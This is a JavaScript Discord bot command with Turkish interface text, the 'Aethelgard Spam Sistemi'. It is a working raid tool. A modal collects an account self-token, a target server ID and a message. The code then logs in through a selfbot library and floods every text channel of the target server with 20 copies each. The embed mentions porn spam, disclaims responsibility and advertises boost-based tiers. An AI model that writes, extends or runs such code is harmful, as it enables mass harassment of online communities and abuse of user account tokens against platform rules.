const { 
    SlashCommandBuilder, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    ModalBuilder, 
    TextInputBuilder, 
    TextInputStyle, 
    InteractionType 
} = require('discord.js');
const { Client: SelfClient } = require('discord.js-selfbot-v13');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('spam')
        .setDescription('Mesaj yağmuru panelini açar.'),

    async execute(interaction) {
        const client = interaction.client;

        // --- OTOMATİK EVENT DİNLEYİCİ ---
        if (!client.spamListenerSet) {
            client.on('interactionCreate', async (int) => {
                await this.handleInteraction(int);
            });
            client.spamListenerSet = true;
        }

        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setAuthor({ name: 'Aethelgard Sunucu Kopyalayıcı', iconURL: client.user.displayAvatarURL() })
            .setTitle('🚀 Aethelgard Spam Sistemi')
            .setDescription(
                `**Ufak bilgilendirme:** Discord’daki her sunucuda olur. Bu, bize yazanları korumaya alıyoruz. Sunucusunu korumak isteyenlerde sadece olmaz; haberiniz olsun. Koruma olanlarda olmaz. Onun dışında hepsi porna ve “bilinmeyen entegrasyon hatası” alırsanız sayfayı yenileyin, düzelir.\n\n` +
                `+ olarak Sunucularınızı korumak istiyorsanız **FORCES | DEVELOPMENT > #📩| destek** açın karşılıksız 2 saniyede korumayı aktif ediyoruz\n\n` +
                `-- **Atılan spamlardan biz sorumlu değiliz!**`
            )
            .addFields(
                { name: '🔹 /mesajat-forces', value: 'Ana sunucuda abone rolüne sahip kişiler kullanabilir.', inline: false },
                { name: '⚡ /mesajat-hızlı', value: '1x boost basanlar içindir.', inline: false },
                { name: '🔥 /mesajat-aşırı-hızlı', value: '5x boost basanlar içindir.', inline: false }
            )
            .setFooter({ text: 'Aethelgard Protection & Raid System' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('spam_modal_ac')
                .setLabel('Saldırıyı Başlat')
                .setStyle(ButtonStyle.Danger)
        );

        await interaction.reply({ embeds: [embed], components: [row], ephemeral: true });
    },

    // --- ETKİLEŞİM YÖNETİCİSİ (Buton ve Modal) ---
    async handleInteraction(interaction) {
        // 1. BUTON: Modal Açılışı
        if (interaction.isButton() && interaction.customId === 'spam_modal_ac') {
            const modal = new ModalBuilder()
                .setCustomId('modal_spam_final')
                .setTitle('Saldırı Yapılandırması');

            const tokenInput = new TextInputBuilder()
                .setCustomId('spam_token')
                .setLabel('Self Token')
                .setPlaceholder('Hesap tokenini girin...')
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            const targetInput = new TextInputBuilder()
                .setCustomId('spam_target_guild')
                .setLabel('Hedef Sunucu ID')
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            const msgInput = new TextInputBuilder()
                .setCustomId('spam_message')
                .setLabel('Spam Mesajı')
                .setStyle(TextInputStyle.Paragraph)
                .setRequired(true);

            modal.addComponents(
                new ActionRowBuilder().addComponents(tokenInput),
                new ActionRowBuilder().addComponents(targetInput),
                new ActionRowBuilder().addComponents(msgInput)
            );

            return await interaction.showModal(modal).catch(() => {});
        }

        // 2. MODAL: Saldırıyı Tetikleme
        if (interaction.type === InteractionType.ModalSubmit && interaction.customId === 'modal_spam_final') {
            await interaction.deferReply({ ephemeral: true });

            const st = interaction.fields.getTextInputValue('spam_token');
            const tid = interaction.fields.getTextInputValue('spam_target_guild');
            const sMsg = interaction.fields.getTextInputValue('spam_message');

            const self = new SelfClient({ checkUpdate: false });

            self.on('ready', async () => {
                try {
                    const target = self.guilds.cache.get(tid);
                    if (!target) return interaction.editReply({ content: '❌ Sunucu bulunamadı!' });

                    await interaction.editReply({ content: '☣️ **Saldırı Başlatıldı!** Kanallar taranıyor ve mesaj yağmuru başlıyor...' });

                    const channels = target.channels.cache.filter(c => c.type === 'GUILD_TEXT');
                    
                    // Her kanala hızlıca spam atar
                    channels.forEach(async (chan) => {
                        for(let i = 0; i < 20; i++) { // Her kanala 20 mesaj
                            await chan.send(sMsg).catch(() => {});
                            await new Promise(r => setTimeout(r, 300));
                        }
                    });

                } catch (e) {
                    await interaction.editReply({ content: 'Bir hata oluştu: ' + e.message });
                }
            });

            self.login(st).catch(() => interaction.editReply({ content: '❌ Token geçersiz!' }));
        }
    }
};
